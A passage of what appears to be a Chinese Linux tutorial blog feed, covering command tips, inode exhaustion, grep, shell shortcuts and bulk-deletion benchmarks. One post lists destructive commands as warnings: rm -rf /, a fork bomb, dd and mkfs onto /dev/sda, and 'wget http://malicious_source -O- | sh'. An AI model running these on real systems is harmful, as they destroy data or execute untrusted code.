     3.5G        452M        345M        3.7G        3.5GSwap:          7.6G          0B        7.6G</code></pre><p>通过free的结果，很容易看到当前总共内存多少，剩余可用内存多少等等。<br>不知道你是否注意到，我们在前面几个命令中，都使用了-h参数，它的作用是使得结果以人类可读的方式呈现，<br>所以我们看到它呈现的单位是G,M等，如果不使用-h参数，可以自己尝试一下会是什么样的结果呈现。</p><h2 id="根据名称查找进程id"><a href="#根据名称查找进程id" class="headerlink" title="根据名称查找进程id"></a>根据名称查找进程id</h2><p>想快速直接查找进程id，可以使用：<br>pgrep hello2.22692或者：</p><pre><code>$ pidof hello22692</code></pre><p>其中，hello是进程名称。</p><h1 id="根据名称杀死进程"><a href="#根据名称杀死进程" class="headerlink" title="根据名称杀死进程"></a>根据名称杀死进程</h1><p>一般我们可以使用kill　-9 pid方式杀死一个进程，但是这样就需要先找到这个进程的进程id，实际上我们也可以直接根据名称杀死进程，例如：$ killall hello或者：<br>可以使用下面的命令查看进程已运行时间：</p><pre><code>$ ps -p 24525 -o lstart,etime                 STARTED     ELAPSEDSat Mar 23 20:52:08 2019       02:45</code></pre><p>其中24525是你要查看进程的进程id。</p><h1 id="快速目录切换"><a href="#快速目录切换" class="headerlink" title="快速目录切换"></a>快速目录切换</h1><p>cd -　回到上一个目录cd  回到用户家目录<br>我们知道使用分号隔开可以执行多条命令，例如：$ cd /temp/log/;rm -rf *但是如果当前目录是/目录，并且/temp/log目录不存在，<br>那么就会发生激动人心的一幕：</p><pre><code>bash: cd: /temp/log: No such file or directory</code></pre><p>因为;可以执行多条命令，但是不会因为前一条命令失败，而导致后面的不会执行，因此，cd执行失败后，仍然会继续执行rm -rf <em>，<br>由于处于/目录下，结果可想而知。<br>所以你还以为这种事故是对rf -rf </em>的力量一无所知的情况下产生的吗？<br>如果解决呢？很简单，使用&amp;&amp;，例如:$ cd /temp/log/ &amp;&amp; rm -rf *<br>这样就会确保前一条命令执行成功，才会执行后面一条。<br>有时候日志文件是压缩的，那么能不能偷懒一下，不解压查看呢？当然可以啦。<br>例如</p><pre><code>$ zcat test.gztest log</code></pre><p>或者：</p><pre><code>$ zless test.gztest log</code></pre><p>比如有一个大文件，你想快速删除，或者不想删除，但是想清空内容：</p><pre><code>&gt;filename</code></pre><h1 id="将日志同时记录文件并打印到控制台"><a href="#将日志同时记录文件并打印到控制台" class="headerlink" title="将日志同时记录文件并打印到控制台"></a>将日志同时记录文件并打印到控制台</h1><p>在执行shell脚本，常常会将日志重定向，但是这样的话，控制台就没有打印了，如何使得既能记录日志文件，又能将日志输出到控制台呢？</p><pre><code>$ ./test.sh |tee test.log</code></pre><h1 id="终止并恢复进程执行"><a href="#终止并恢复进程执行" class="headerlink" title="终止并恢复进程执行"></a>终止并恢复进程执行</h1><p>我们使用ctrl+z 暂停一个进程的执行，也可以使用fg恢复执行。例如我们使用<br>当我们发现文件内容可能很多时，使用ctrl + z暂停程序，而如果又想要从刚才的地方继续执行，则只需要使用fg命令即可恢复执行。或者使用bg使得进程继续在后台执行。<br>我们可能会进程写一些小程序，并且想要知道它的运行时间，实际上我们可以很好的利用time命令帮我们计算，例如：</p><pre><code>$ time ./fibo 30the 30 result is 832040real    0m0.088suser    0m0.084ssys    0m0.004s</code></pre><p>它会显示系统时间，用户时间以及实际使用的总时间。</p><h1 id="查看内存占用前10的进程"><a href="#查看内存占用前10的进程" class="headerlink" title="查看内存占用前10的进程"></a>查看内存占用前10的进程</h1><pre><code>$ ps -aux |sort -k4nr | head -n 10</code></pre><p>我们都知道man可以查看命令的帮助手册，但是如果我们想要某个功能却不知道使用哪个命令呢？别着急，还是可以使用man：</p><pre><code>$ man -k &quot;copy files&quot;cp (1)               - copy files and directoriescpio (1)             - copy files to and from archivesgit-checkout-index (1) - Copy files from the index to the working treegvfs-copy (1)        - Copy filesgvfs-move (1)        - Copy filesinstall (1)          - copy files and set attributes</code></pre><p>使用-k参数，使得与copy files相关的帮助手册都显示出来了。<br>我们知道，在命令行下，复制不能再是ctrl + c了，因为它表示终止当前进程，而控制台下的复制粘贴需要使用下面的快捷键：</p><pre><code>ctrl +  insertshift + insert</code></pre><h1 id="例如，要在当前目录下查找包含test字符串的文件："><a href="#例如，要在当前目录下查找包含test字符串的文件：" class="headerlink" title="例如，要在当前目录下查找包含test字符串的文件："></a>例如，要在当前目录下查找包含test字符串的文件：</h1><pre><code>$ grep -rn &quot;test&quot;test2.txt:1:test</code></pre><p>它便可以找到该字符串在哪个文件的第几行。<br>程序运行时，终端可能输出大量的日志，你想简单查看一下，又不想记录日志文件，此时可以使用ctrl+s键，冻结屏幕，使得日志不再继续输出，而如果想要恢复，可使用ctrl+q退出冻结。<br>如果在某些系统上连基本的vi编辑器都没有，那么可以使用下面的方式进行编辑内容：</p><pre><code>$ cat &gt;file.txtsome words(ctrl+d)</code></pre><p>编辑完成后，ctrl+d即可保存。</p><h1 id="查看elf文件头信息"><a href="#查看elf文件头信息" class="headerlink" title="查看elf文件头信息"></a>查看elf文件头信息</h1><p>例如：</p><pre><code>$ readelf -h filename</code></pre><p>我们在显示结果中，可以看到运行的平台，elf文件类型，大小端情况等。<br>查看库中是否包含某个接口</p><pre><code>$ nm filename |grep interface</code></pre><p>这里是从文件filename中查看是否包含interface接口，前提是该文件包含符号表。<br>如果要对一个已输入的命令进行修改，可以使用 ^a（ctrl + a）或 ^e（ctrl + e）将光标快速移动到命令的开头或命令的末尾。<br>还可以使用 ^ 字符实现对上一个命令的文本替换并重新执行命令，例如 ^before^after^ 相当于把上一个命令中的 before 替换为 after 然后重新执行一次。</p><h1 id="使用远程机器的名称登录到机器上"><a href="#使用远程机器的名称登录到机器上" class="headerlink" title="使用远程机器的名称登录到机器上"></a>使用远程机器的名称登录到机器上</h1><p>如果使用命令行登录其它机器上，可以考虑添加别名。在别名中，可以填入需要登录的用户名（与本地系统上的用户名可能相同，也可能不同）以及远程机器的登录信息。<br>例如使用 server_name =’ssh -v -l username IP-address’ 这样的别名命令：</p><pre><code>$ alias butterfly=”ssh -v -l jdoe 192.168.0.11”</code></pre><p>也可以通过在 /etc/hosts 文件中添加记录或者在 DNS 服务器中加入解析记录来把 IP 地址替换成易记的机器名称。<br>执行 alias 命令可以列出机器上已有的别名。</p><pre><code>$ aliasalias butterfly=&#39;ssh -v -l jdoe 192.168.0.11&#39;alias c=&#39;clear&#39;alias egrep=&#39;egrep --color=auto&#39;alias fgrep=&#39;fgrep --color=auto&#39;alias grep=&#39;grep --color=auto&#39;alias l=&#39;ls -CF&#39;alias la=&#39;ls -A&#39;</code></pre><p>只要将新的别名添加到 ~/.bashrc 或类似的文件中，就可以让别名在每次登录后都能立即生效。<br>^s（ctrl + s）将通过执行流量控制命令 XOFF 来停止终端输出内容，这会对 PuTTY 会话和桌面终端窗口产生影响。<br>如果误输入了这个命令，可以使用 ^q（ctrl + q）让终端重新响应。所以只需要记住 ^q 这个组合键就可以了，毕竟这种情况并不多见。<br>Linux 提供了很多让用户复用命令的方法，其核心是通过历史缓冲区收集执行过的命令。复用命令的最简单方法是输入 ! 然后接最近使用过的命令的开头字母；<br>当然也可以按键盘上的向上箭头，直到看到要复用的命令，然后按回车键。还可以先使用 history 显示命令历史，然后输入 ! 后面再接命令历史记录中需要复用的命令旁边的数字。<br>!! &lt;== 复用上一条命令!ec &lt;== 复用上一条以 “ec” 开头的命令!76 &lt;== 复用命令历史中的 76 号命令</p><h1 id="查看日志文件并动态显示更新内容"><a href="#查看日志文件并动态显示更新内容" class="headerlink" title="查看日志文件并动态显示更新内容"></a>查看日志文件并动态显示更新内容</h1><p>使用形如 tail -f /var/log/syslog 的命令可以查看指定的日志文件，并动态显示文件中增加的内容，<br>需要监控向日志文件中追加内容的的事件时相当有用。这个命令会输出文件内容的末尾部分，并逐渐显示新增的内容。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux inode资源耗尽问题</title>
      <link href="/2024/07/29/sixteen/"/>
      <url>/2024/07/29/sixteen/</url>
      
        <content type="html"><![CDATA[<p>Linux系统下文件数据储存在”块”中，文件的元信息，例如文件的创建者、文件的创建日期、文件的大小等。<br>这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。<br>inode也占用硬盘空间，硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；<br>另一个是inode区（inode table），存放inode所包含的信息。<br>每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。<br>假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，<br>占整块硬盘的12.8%。inodes使用完与存储空间使用完相似，都是创建不了文件或无法正常执行一些命令。inodes使用完，存储空间可能还有，<br>这种情况一般是生成了大量的小文件，把inode table占满。<br>一般情况下存储空间使用完，inodes往往才使用百分之几，所以容易忽视对inodes使用情况的监控。<br>借用网图来说明inodes用尽，而磁盘空间还未用完的情况：<br>查看磁盘空间使用情况，使用df命令<br>查看inodess使用情况，使用df -i命令<br>上述两个命令可以使用-h参数，命令为df -h和df -hi。从图中看见磁盘空间使用71%，但是inodes使用100%。<br>inodes的大小在磁盘格式化分区时确定，跟分区的大小相关，分区越大，inodes越大，反之亦然。<br>linux操作系统根目录一般分区比较小，如果有定时性的小文件产生而又未及时清理，则很容易造成inodes占满。<br>inodes占满解决步骤：</p><h1 id="查看文件最多的目录"><a href="#查看文件最多的目录" class="headerlink" title="查看文件最多的目录"></a>查看文件最多的目录</h1><pre><code>for i in /*; do echo $i; find $i | wc -l; done</code></pre><p>如果确定目录范围，把/*写的具体点<br>最终发现是/var/spool/postfix/maildrop目录下小文件过多，原因如下：<br>由于linux在执行cron时，会将cron执行脚本中的output和warning信息，都会以邮件的形式发送给cron所有者。<br>由于客户环境中的sendmail和postfix没有正常运行，邮件发送不成功，导致全部小文件都堆积在maildrop目录下，<br>另由于缺乏自动清理的机制，故此目录下堆积了大量的文件。<br>经过排查root用户下发现有个每分钟进行一次时钟同步的定时任务，该定时任务每分钟产生一个小文件。</p><h1 id="删除大量文件"><a href="#删除大量文件" class="headerlink" title="删除大量文件"></a>删除大量文件</h1><pre><code>ls | xargs -n 1000 rm -rf</code></pre><p>需要使用xargs命令，不然会删除失败。</p><h2 id="设置方面"><a href="#设置方面" class="headerlink" title="设置方面"></a>设置方面</h2><p>在crontab -e 第一行增加MAILTO=”” ，就没有文件产生啦</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>对定时任务设置定向输出文件，不需要日志输出的定时任务可以将日志重定向到/dev/null，如下：</p><pre><code>*/10 * * * * /tmp/test.sh &gt;/dev/null 2&gt;&amp;1</code></pre><h1 id="定时清理文件"><a href="#定时清理文件" class="headerlink" title="定时清理文件"></a>定时清理文件</h1><pre><code>find 目录 -type f -mtime +30 | xargs -n 1000 rm -f</code></pre><h1 id="监控inodes的使用"><a href="#监控inodes的使用" class="headerlink" title="监控inodes的使用"></a>监控inodes的使用</h1><p>备注：应注意crontab的写法和产生的文件的定时清理</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux grep 文本查找</title>
      <link href="/2024/07/29/fifteen/"/>
      <url>/2024/07/29/fifteen/</url>
      
        <content type="html"><![CDATA[<p>之前介绍过很多linux下查找相关的命令，而对文件内容搜索的命令似乎还没有涉及，因此本文介绍文本搜索命令–grep。<br>常见用法<br>我们会经常结合管道符（|）来使用它，即在前面命令执行的结果中查找包含相关字符串的内容。例如：</p><pre><code>$ ps -ef | grep redis</code></pre><p>ps -ef用于查看系统进程情况，但是它列出的结果很多，如果我们只想看到自己需要的，则通过管道符，用grep进行过滤搜索，<br>例如搜索redis相关的进程，最后它只会列出和redis相关的进程了：</p><pre><code>$  ps -ef | grep redisroot     10748 10733  0 21:14 pts/21   00:00:00 redis-server *:6379root     10754 10733  0 21:14 pts/21   00:00:00 grep --color=auto redis</code></pre><p>那么如果要排除某些不相关信息呢？我们可以使用-v参数</p><pre><code>$ ps -ef | grep redis |grep -v autoroot     10748 10733  0 21:14 pts/21   00:00:00 redis-server *:6379</code></pre><p>这样一来，包含auto相关的结果就不会出现在最终结果里了。<br>如果只想统计结果数量呢？我们可以结合-c（count）参数：</p><pre><code>$ ps -ef | grep redis -c2</code></pre><h1 id="文件内容搜索"><a href="#文件内容搜索" class="headerlink" title="文件内容搜索"></a>文件内容搜索</h1><p>好了，说完了最常见的用法，我们来看看如何搜索文件内容。实际上awk和sed在这方面也颇有经验，<br>不过本文的主角是grep，所以另外两个命令暂时不涉及。我们来看几个实例。<br>在指定文件中查找指定关键字<br>例如，要在linux_command_debug.md文件中，查找test字符串：</p><pre><code>$  grep &quot;test&quot; aaa/bbb/linux_command_debug.mdint test(int a,int b)    test(a,b);</code></pre><p>如果想要显示指定关键字的行号，可以使用-n参数，例如：</p><pre><code>$  grep -n &quot;test&quot; aaa/bbb/linux_command_debug.md18:int test(int a,int b)27:    test(a,b);</code></pre><h1 id="搜索时指定或排除多个文件"><a href="#搜索时指定或排除多个文件" class="headerlink" title="搜索时指定或排除多个文件"></a>搜索时指定或排除多个文件</h1><p>前面提到了对一个文件内容进行搜索，如果是多个呢？或者不想从某些文件里搜索呢？<br>如果想对文件进行指定也是可以的，例如搜索所有的md结尾的文件：</p><pre><code>$  grep -n &quot;test&quot; *.md</code></pre><p>或者可以使用–exclude参数来排除某些文件，例如，查找包含test，但是排除txt文件：</p><pre><code>$ grep -rn &quot;test&quot; --exclude=*.txt</code></pre><p>搜索时就会忽略.txt结尾的文件了。<br>如果要排除的条件比较多，可以将要排除的条件存储在另外一个文件里：</p><pre><code>$ grep -rn &quot;test&quot; --exclude-from=skip.txt</code></pre><p>skip.txt的内容可以是模式匹配的文件名或者具体文件名：</p><pre><code>*.txttest.md</code></pre><p>这样，以.txt结尾，以及test.md文件都不会搜索了。<br>除此之外，还可以排除指定目录，它需要用到–exclude-dir参数：</p><pre><code>$ grep -rn &quot;test&quot; --exclude-dir=aaa</code></pre><p>它在搜索时将会跳过aaa目录下的文件。</p><h1 id="查找包含指定关键字的文件"><a href="#查找包含指定关键字的文件" class="headerlink" title="查找包含指定关键字的文件"></a>查找包含指定关键字的文件</h1><p>如果要在当前目录下所有文件查找包含“int main(void)”字符串的文件：</p><pre><code>$ grep -rn &quot;int main(void)&quot;aaa/bbb/c_main_func.md:49:int main(void)aaa/bbb/c_main_func.md:71:int main(void) { /* ... */ }aaa/bbb/c_array.md:104:int main(void)aaa/bbb/c_array.md:129:int main(void)aaa/bbb/pc-lint.md:42:int main(void)aaa/bbb/pc-lint.md:128:int main(void)</code></pre><p>这可能是最实用的使用方法之一了。这里-r参数表示递归查找当前目录的文件，-n会显示查找位置的行号，如果只想显示包含该指定关键字的文件名，可使用-l（–file-with-matches）参数：</p><pre><code>$ grep -rln &quot;int main(void)&quot;aaa/bbb/c_main_func.mdaaa/bbb/c_array.mdaaa/bbb/pc-lint.md</code></pre><p>如果你尝试一下就会发现，如果不带-r参数，它会暂停，等待你从控制台输入，例如：</p><pre><code>$ grep -n &quot;test&quot;test1:test</code></pre><p>所以使用时记得带上相关参数奥！</p><h1 id="查找不包含指定关键字的文件"><a href="#查找不包含指定关键字的文件" class="headerlink" title="查找不包含指定关键字的文件"></a>查找不包含指定关键字的文件</h1><p>前面提到了如何查找包含某个关键字的文件，如果要找的是不包含该关键字的文件呢？<br>实际上只要使用-L参数即可:</p><pre><code>$ grep -rLn &quot;int main(void)&quot;</code></pre><p>(这里会显示不包含指定关键字内容的文件名)</p><h1 id="搜索时忽略大小写"><a href="#搜索时忽略大小写" class="headerlink" title="搜索时忽略大小写"></a>搜索时忽略大小写</h1><p>使用-i（–ignore-case）参数即可：</p><pre><code>$ grep -rni &quot;int MAIN(void)&quot;aaa/bbb/c_main_func.md:49:int main(void)aaa/bbb/c_main_func.md:71:int main(void) { /* ... */ }aaa/bbb/c_array.md:104:int main(void)aaa/bbb/c_array.md:129:int main(void)aaa/bbb/pc-lint.md:42:int main(void)aaa/bbb/pc-lint.md:128:int main(void)</code></pre><h1 id="搜索显示不包含指定关键字的行"><a href="#搜索显示不包含指定关键字的行" class="headerlink" title="搜索显示不包含指定关键字的行"></a>搜索显示不包含指定关键字的行</h1><p>前面的大部分例子都是显示符合条件的行，如果要显示不符合条件的行呢？可以用我们前面提到的-v参数：</p><pre><code>$ grep -rnv &quot;int main(void)&quot;</code></pre><p>(内容较多，未显示)<br>从结果中就会发现，它会展示出包含指定关键字的文件，但是展示的是不包含该关键字的行。</p><h1 id="显示指定关键字前后内容"><a href="#显示指定关键字前后内容" class="headerlink" title="显示指定关键字前后内容"></a>显示指定关键字前后内容</h1><p>假如你需要查看包含指定关键字行附近的行，前面的方式是没有办法看到的，不过我们可以用-A(–after-context=)和-B(–before-context=)参数来显示前后的行：</p><pre><code>$ grep -rn &quot;int main(void)&quot; -A 1 -B 1aaa/bbb/c_array.md-103-}aaa/bbb/c_array.md:104:int main(void)aaa/bbb/c_array.md-105-{</code></pre><p>(其他内容省略)<br>通过最后加上-A和-B参数，显示了指定关键字前后的行，这在日志搜索分析时非常有用。<br>指定规则文件进行搜索<br>如果有多个搜索关键字怎么处理呢？我们可以把关键字写在一个文件，搜索时指定文件即可，例如规则文件为key.txt：</p><pre><code>int main(void)test</code></pre><p>从指定文件中搜索上面的关键字：</p><pre><code>$ cat filename |grep -f key.txt</code></pre><p>这样结果就会显示匹配key.txt文件中所有关键字的行，非常适合用于多个条件的搜索。</p><h1 id="正则表达式搜索"><a href="#正则表达式搜索" class="headerlink" title="正则表达式搜索"></a>正则表达式搜索</h1><p>看完前面的内容，是不是还没有感受到grep的强大？grep的另一个强大之处是，它的搜索支持正则表达式，例如查找文本行以t开头，<br>以t结尾的文件：</p><pre><code>$ grep -rn ^t.*t$key.txt:2:testaaa/bbb/c_operate_redis_start.md:68:typedef struct Stu_Info_Structaaa/bbb/c_operate_redis_start.md:101:typedef struct Stu_Info_Struct</code></pre><p>其中^t，表明以t开头，t$表明以t结尾，如果需要使用扩展的正则表达式进行搜索，可使用egrep命令。<br>关于正则表达式的写法，本文不做详细介绍。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在内容搜索方面，grep常常能够助我们一臂之力，因此掌握grep的使用也是linux学习不可缺少的一部分，当然我们不需要完全记住每个参数的作用，但我们至少知道有这样的参数，并且在需要时能够快速查询到。本文常用参数如下：<br>    • -v #显示不包含匹配关键字的所有行。<br>    • -l #显示包含匹配关键字的文件<br>    • -L #显示不包含匹配关键字的文件<br>    • -r #递归搜索<br>    • -i #忽略大小写<br>    • -n #显示关键字所在行号<br>    • -A n #显示关键字后n行<br>    • -B n #显示关键字前n行<br>    • –exclude #搜索时排除某些文件<br>    • –exclude-dir #搜索时排除某些目录<br>    • -f #指定规则文件进行搜索</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 10个危险的命令</title>
      <link href="/2024/07/28/fourteen/"/>
      <url>/2024/07/28/fourteen/</url>
      
        <content type="html"><![CDATA[<p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。<br>这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。<br>当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p><h1 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h1><p>rm -rf命令是删除文件夹及其内容最快的方式之一。<br>仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。<br>下列是一些rm 命令的选项：<br>    • rm　命令在Linux下通常用来删除文件。<br>    • rm -r 命令递归的删除文件夹，甚至是空的文件夹<br>    • rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。<br>    • rm -rf / : 强制删除根目录下所有东东。<br>    • rm -rf *:　强制删除当前目录的所有文件。<br>    • rm -rf . : 强制删除当前文件夹及其子文件夹。<br>从现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）</p><h1 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){:|:&amp;};: 命令"></a>:(){:|:&amp;};: 命令</h1><p>这就是个fork 炸弹的实例。<br>具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p><h1 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令　&gt; /dev/sda"></a>命令　&gt; /dev/sda</h1><p>这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。<br>该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p><h1 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h1><p>这个命令会移动某个‘文件夹‘到/dev/null。<br>在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。<br>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p><h1 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h1><p>该命令会从一个（也许是）恶意源下载一个脚本并执行。<br>Ｗget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。<br>注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p><h1 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h1><p>上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。<br>通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。<br>一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。</p><h1 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h1><p>这个命令常用来清空文件内容或记录命令输出。<br>不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。<br>你可能真正想用的是“&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。<br>如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。</p><h1 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h1><p>这个命令用来编辑先前运行的命令而无需重打整个命令。<br>用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p><h1 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h1><p>这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。<br>记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p><h1 id="隐藏命令"><a href="#隐藏命令" class="headerlink" title="隐藏命令"></a>隐藏命令</h1><p>下面的命令其实就是上面第一个命令 (rm -rf)。<br>这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。<br>真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。<br>切记，千万不要编译／运行从未知来源的代码。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell一些快捷键</title>
      <link href="/2024/07/28/thirteen/"/>
      <url>/2024/07/28/thirteen/</url>
      
        <content type="html"><![CDATA[<p>ctrl + a:光标移到行首。<br>ctrl + e:光标移到行尾。<br>ctrl + b:光标左移一个字母, 向行首移动一个字符<br>ctrl + f:光标右移,向行尾移动一个字符<br>ctrl + c:杀死当前进程。<br>ctrl + d:退出当前 Shell,从Shell提示中注销并关闭，使用该快捷键就不必键入exit<br>ctrl + h:删除光标前一个字符，同 backspace 键相同。<br>ctrl + l:清屏，相当于clear。<br>ctrl + r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history<br>ctrl + k:清除光标后至行尾的内容。<br>ctrl + u:清除光标前至行首间的所有内容。<br>ctrl + w:移除光标前的一个单词<br>ctrl + t:交换光标位置前的两个字符(包括光标所在的当前位置)<br>ctrl + y:粘贴或者恢复上次的删除<br>ctrl + d:删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符<br>ctrl + z:把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1<br>然后ctrl + z ，到后台，然后fg,重新恢复</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux history 显示命令执行的时间</title>
      <link href="/2024/07/28/twleve/"/>
      <url>/2024/07/28/twleve/</url>
      
        <content type="html"><![CDATA[<p>显示历史命令之行时间</p><pre><code>echo &quot;export HISTTIMEFORMAT=&quot;%F %T  &quot;&quot; &gt;&gt; ~/.bashrc</code></pre><p>一次会话的话先执行</p><pre><code>export HISTTIMEFORMAT=&quot;%F %T&quot;</code></pre><p>然后使用history 命令就行了</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 删除大量文件效率对比</title>
      <link href="/2024/07/24/eleven/"/>
      <url>/2024/07/24/eleven/</url>
      
        <content type="html"><![CDATA[<p>首先建立50万个文件</p><pre><code>for i in $(seq 1 500000);do echo text &gt;&gt;$i.txt;done</code></pre><h1 id="rm删除"><a href="#rm删除" class="headerlink" title="rm删除"></a>rm删除</h1><pre><code>time rm -f *zshsure you want to delete all the files in /home/hungerr/test [yn]? yzsh: argument list too long</code></pre><p>total由于文件数量过多，rm不起作用。</p><h1 id="find删除"><a href="#find删除" class="headerlink" title="find删除"></a>find删除</h1><pre><code>time find ./ -type f -exec rm {} \;</code></pre><p>49.86s user 1032.13s system 41% cpu 43:19.17 total<br>大概43分钟,我的电脑。。。。。。边看视频边删的。</p><h1 id="find-with-delete"><a href="#find-with-delete" class="headerlink" title="find with delete"></a>find with delete</h1><pre><code>time find ./ -type f -delete</code></pre><p>0.43s user 11.21s system 2% cpu 9:13.38 total用时9分钟。</p><h1 id="rsync删除"><a href="#rsync删除" class="headerlink" title="rsync删除"></a>rsync删除</h1><p>首先建立空文件夹blanktest</p><pre><code>time rsync -a --delete blanktest/</code></pre><p>0.59s user 7.86s system 51% cpu 16.418 total16s，很好很强大。</p><h1 id="Python删除"><a href="#Python删除" class="headerlink" title="Python删除"></a>Python删除</h1><pre><code>import osimport timeitdef main():    for pathname,dirnames,filenames in os.walk(&#39;/home/username/test&#39;):        for filename in filenames:            file=os.path.join(pathname,filename)            os.remove(file)if __name__==&#39;__main__&#39;:    t=timeit.Timer(&#39;main()&#39;,&#39;from __main__ import main&#39;)    print t.timeit(1)python test.py529.309022903大概用时9分钟。</code></pre><h1 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h1><p>rm：文件数量太多，不可用<br>find with -exec 50万文件耗时43分钟<br>find with -delete 9分钟<br>Python 9分钟<br>rsync with -delete  16s<br>结论：删除大量小文件rsync最快，最方便。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统查找大文件</title>
      <link href="/2024/07/24/ten/"/>
      <url>/2024/07/24/ten/</url>
      
